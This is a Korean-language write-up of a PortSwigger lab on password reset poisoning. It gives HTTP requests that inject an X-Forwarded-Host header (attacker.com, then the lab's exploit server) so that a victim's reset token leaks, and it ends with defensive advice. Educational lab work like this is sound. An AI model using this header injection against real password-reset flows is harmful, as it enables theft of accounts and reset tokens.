+++
date = '2026-08-07T09:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Password reset poisoning via middleware'
summary = "X-Forwarded-Host 헤더로 비밀번호 재설정 링크의 도메인을 공격자 서버로 바꿔, 피해자가 클릭한 재설정 토큰을 탈취해 계정을 탈취하는 Authentication 풀이"
toc = true
tags = ["Authentication", "Password Reset", "Host Header", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)

> ![image.png](/writeup/portswigger/authentication/11/1.png)

이 랩은 password reset poisoning에 취약하다. `carlos`는 이메일로 받은 링크를 모두 클릭한다. 이를 이용해 `carlos`의 계정으로 로그인하면 문제가 해결된다. 실습 계정은 `wiener:peter`이며, Exploit Server에서 이메일 클라이언트를 확인할 수 있다.

### Authentication 진단

먼저 재설정 기능을 정상적으로 사용해 흐름을 본다.

![image.png](/writeup/portswigger/authentication/11/2.png)

username을 넣어 재설정을 요청하면 링크가 담긴 이메일이 오고, 링크를 따라가면 새 비밀번호 입력 창으로 이동한다.

![image.png](/writeup/portswigger/authentication/11/3.png)

재설정 요청과 링크는 다음과 같다.

```http
POST /forgot-password HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

```http
GET /forgot-password?temp-forgot-password-token=u4wv1ybna85fvs54hicfc5wtlwpsynm2 HTTP/2
Host: <lab-id>.web-security-academy.net
```

`temp-forgot-password-token`은 위조하기 어려운 값이다. 하지만 문제는 "carlos가 링크를 모두 클릭한다"고 명시한다 — 토큰을 위조하는 게 아니라, **토큰이 담긴 링크의 도메인을 공격자 것으로 바꿔** 피해자가 클릭하게 만드는 방향이다. 링크 도메인은 서버가 이메일을 조립할 때 결정하므로, 그 결정에 영향을 주는 헤더를 찾는다.

`Host` 헤더를 임의 값으로 바꾸면 `Invalid host` 응답이 온다. 대신 프록시·미들웨어가 널리 참조하는 비표준 헤더 `X-Forwarded-Host`를 추가해 본다.

```http
POST /forgot-password HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
X-Forwarded-Host: attacker.com

username=wiener
```

이 요청을 보내면 재설정 이메일의 링크 도메인이 `attacker.com`으로 바뀐다. **서버가 링크를 만들 때 `X-Forwarded-Host`를 신뢰**하는 것이다.

![image.png](/writeup/portswigger/authentication/11/4.png)

---

## 익스플로잇

`X-Forwarded-Host`에 Exploit Server 호스트를 넣고, 대상을 `carlos`로 지정해 재설정을 요청한다.

```http
POST /forgot-password HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
X-Forwarded-Host: exploit-<exploit-id>.exploit-server.net

username=carlos
```

`carlos`에게는 유효한 재설정 토큰이 담기되 도메인만 Exploit Server로 바뀐 링크가 발송된다. `carlos`가 이 링크를 클릭하면 Exploit Server의 접근 로그에 그의 토큰이 그대로 남는다.

![image.png](/writeup/portswigger/authentication/11/5.png)

로그에서 얻은 토큰을 실제 랩의 `/forgot-password?temp-forgot-password-token=...`에 붙여 접근한 뒤 비밀번호를 재설정하고, `carlos`로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/11/6.png)

---

## 정리

이 랩의 결함은 재설정 토큰의 강도가 아니라 **토큰이 전달되는 경로를 공격자가 통제**할 수 있다는 데 있다. 토큰은 추측 불가능하지만, 서버가 재설정 링크의 호스트를 `X-Forwarded-Host` 같은 클라이언트 통제 헤더로 조립하는 순간, 공격자는 토큰을 위조할 필요 없이 그 토큰을 자기 서버로 배달시킨다. 피해자가 링크를 클릭하는 순간 유효한 토큰이 공격자에게 노출된다.

핵심은 이메일 링크·리다이렉트·절대 URL을 만들 때 **호스트를 요청 헤더에서 가져오지 않는 것**이다. 도메인은 서버 설정에 고정된 값으로 생성해야 하며, `Host`·`X-Forwarded-Host`를 신뢰하면 재설정 포이즈닝뿐 아니라 web cache poisoning·SSRF 등 Host 헤더 공격 전반에 노출된다. 부가적으로, 재설정 토큰은 일회성·단기 만료로 발급해 노출되더라도 창이 좁아지게 한다.

이는 [password reset broken logic](/write-up/portswigger/authentication/write-up-portswigger---password-reset-broken-logic/)이 "대상 계정을 파라미터로 지정한" 결함이었던 것과 짝을 이룬다. 그쪽은 토큰이 적용될 계정을, 이쪽은 토큰이 전달될 경로를 공격자가 통제한다. 둘 다 강한 토큰을 무력화하는 것은 토큰 주변의 신뢰 경계다. 클라이언트 통제 헤더를 근거로 삼는다는 점에서 [Access Control의 Referer 기반 검증](/write-up/portswigger/access-control/write-up-portswigger---referer-based-access-control/)과도 같은 계열의 실수다.
